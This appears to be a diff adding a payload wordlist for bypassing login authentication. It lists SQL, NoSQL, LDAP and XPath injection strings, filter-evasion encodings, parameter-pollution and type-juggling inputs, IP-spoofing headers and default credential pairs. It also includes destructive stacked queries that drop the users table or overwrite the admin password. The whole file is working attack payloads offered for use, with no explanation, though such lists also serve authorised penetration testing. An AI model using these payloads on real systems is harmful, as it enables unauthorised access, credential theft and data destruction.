@@ -1,0 +1,205 @@
+# Authentication Bypass Payloads
+# SQL Injection and Logic-based Authentication Bypass
+
+# SQL Injection - Basic Bypass
+admin' OR '1'='1
+admin' OR '1'='1'--
+admin' OR '1'='1'#
+admin' OR '1'='1'/*
+admin'--
+admin' #
+admin'/*
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+' OR '1'='1'/*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+admin' OR 'a'='a
+admin' OR 'a'='a'--
+' OR 'x'='x
+' OR 'x'='x'--
+
+# SQL Injection - Advanced
+admin') OR ('1'='1
+admin') OR ('1'='1'--
+') OR ('1'='1'--
+admin')) OR (('1'='1
+' OR ''='
+" OR ""="
+' OR 1=1 LIMIT 1--
+admin' AND '1'='1'--
+' UNION SELECT NULL--
+' UNION SELECT 'admin', 'admin'--
+
+# SQL Injection - Different Databases
+admin' OR '1'='1' LIMIT 1--
+admin' OR '1'='1' LIMIT 1#
+admin' OR 1=1 LIMIT 1;#
+' OR 1=1--
+' OR 1=1#
+' OR 1=1;#
+admin' OR 'x'='x';--
+
+# Boolean-based Bypass
+1' OR '1'='1
+0' OR '1'='1
+admin'='admin
+' OR username='admin'--
+' OR email='admin@admin.com'--
+
+# Numeric Bypass
+1 OR 1=1
+1' OR 1=1--
+1 OR 1=1--
+' OR user_id=1--
+
+# Blind SQL Injection
+admin' AND SLEEP(5)--
+admin' AND 1=1--
+admin' AND 1=2--
+
+# NoSQL Injection
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$regex": "admin"}, "password": {"$regex": ".*"}}
+admin'||'1'=='1
+admin'||'1'=='1'//
+' || 1==1//
+' || 1==1%00
+
+# LDAP Injection
+*
+admin*
+admin*)(&
+*)(uid=*))(|(uid=*
+admin)(&(password=*)
+
+# XPath Injection
+' or '1'='1
+' or ''='
+x' or 1=1 or 'x'='y
+' or //user[name='admin']
+
+# Username Enumeration Bypass
+admin'-- -
+administrator'--
+root'--
+test'--
+guest'--
+
+# Password Field Bypass
+' OR 1=1--
+' OR '1'='1
+OR 1=1--
+' OR ''='
+" OR 1=1--
+" OR ""="
+
+# Comment Bypass
+admin'/**/OR/**/'1'='1
+admin'/**/OR/**/1=1--
+'/**/OR/**/1=1#
+
+# Encoding Bypass
+%27%20OR%20%271%27%3D%271
+%61%64%6d%69%6e%27%20%4f%52%20%27%31%27%3d%27%31
+admin%27%20OR%20%271%27=%271
+
+# Case Variation
+AdMiN' Or '1'='1
+ADMIN' OR '1'='1
+aDmIn'--
+
+# Null Byte Injection
+admin'%00
+admin'%00--
+' OR 1=1%00
+
+# Time-based Bypass
+admin' AND SLEEP(5)--
+admin' AND BENCHMARK(5000000,MD5(1))--
+admin' WAITFOR DELAY '00:00:05'--
+
+# Union-based Information Disclosure
+' UNION SELECT username, password FROM users--
+' UNION SELECT NULL, NULL--
+' UNION ALL SELECT username, password FROM users--
+
+# Stacked Queries
+admin'; DROP TABLE users--
+admin'; UPDATE users SET password='hacked' WHERE username='admin'--
+
+# Default Credentials (not injection but testing)
+admin:admin
+admin:password
+admin:12345
+root:root
+administrator:administrator
+guest:guest
+test:test
+demo:demo
+
+# Logic Bypass
+true
+false
+1
+0
+yes
+no
+
+# JSON Parameter Pollution
+{"username":"admin","username":"hacker"}
+{"password":"wrong","password":"' OR '1'='1"}
+
+# Array Bypass
+username[]=admin&password[]=anything
+username[$ne]=admin&password[$ne]=anything
+
+# Type Juggling
+{"username": "admin", "password": true}
+{"username": "admin", "password": 1}
+{"username": "admin", "password": []}
+
+# Parameter Pollution
+?username=admin&username=' OR '1'='1
+?user=admin&user=' OR 1=1--
+
+# HTTP Verb Tampering
+# Use with different HTTP methods: GET, POST, PUT, DELETE, PATCH
+
+# Header Injection
+X-Forwarded-For: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+
+# Second-Order SQL Injection
+admin'-- (store this, exploit later)
+
+# Unicode Bypass
+ａｄｍｉｎ' OR '1'='1
+＇ ＯＲ ＇１＇＝＇１
+
+# Backtick Bypass
+admin` OR `1`=`1
+`OR`1`=`1
+
+# Alternative Comment Syntax
+admin'||--
+admin'||#
+admin'||/*
+
+# String Concatenation
+'ad'+'min'--
+'ad'||'min'--
+CONCAT('ad','min')--
+
+# Hex Encoding
+0x61646d696e (admin in hex)
+' OR 0x313d31--
+
+# Alternative Quotes
+admin` OR 1=1--
+admin" OR "1"="1
